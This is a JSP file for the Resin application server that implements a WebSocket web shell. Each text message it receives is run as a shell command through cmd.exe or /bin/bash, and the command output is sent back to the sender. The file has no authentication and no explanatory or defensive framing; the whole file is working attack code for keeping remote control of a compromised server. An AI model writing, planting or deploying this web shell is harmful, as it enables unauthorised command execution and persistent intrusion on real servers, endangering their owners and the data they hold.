<%@ page import="com.caucho.websocket.WebSocketListener" %>
<%@ page import="com.caucho.websocket.WebSocketServletRequest" %>
<%@ page import="com.caucho.websocket.WebSocketContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.Reader" %>
<%@ page import="java.io.PrintWriter" %>

<%!
    public static class CmdListener implements WebSocketListener {
        public void onReadText(WebSocketContext context, Reader is) throws IOException {
            StringBuilder sb = new StringBuilder();
            int ch;
            while ((ch = is.read()) >= 0) {
                sb.append((char) ch);
            }
            try {
                Process process;
                boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
                if (bool) {
                    process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", sb.toString() });
                } else {
                    process = Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", sb.toString() });
                }
                InputStream inputStream = process.getInputStream();
                StringBuilder stringBuilder = new StringBuilder();
                int i;
                while ((i = inputStream.read()) != -1)
                    stringBuilder.append((char)i);
                inputStream.close();
                process.waitFor();
                PrintWriter writer = context.startTextMessage();
                writer.print(stringBuilder);
                writer.close();
            } catch (Exception ignored) {
            }
        }
        public void onStart(WebSocketContext context) throws IOException {}
        public void onReadBinary(WebSocketContext context, InputStream is) throws IOException {}
        public void onClose(WebSocketContext context) throws IOException {}
        public void onDisconnect(WebSocketContext context) throws IOException {}
        public void onTimeout(WebSocketContext context) throws IOException {}
    }
%>
<%
    String protocol = request.getHeader("Upgrade");
    if (! "websocket".equals(protocol)) {
        out.println("not websocket");
        return;
    }
    WebSocketListener listener = new CmdListener();
    WebSocketServletRequest wsReq = (WebSocketServletRequest) request;
    wsReq.startWebSocket(listener);
%>
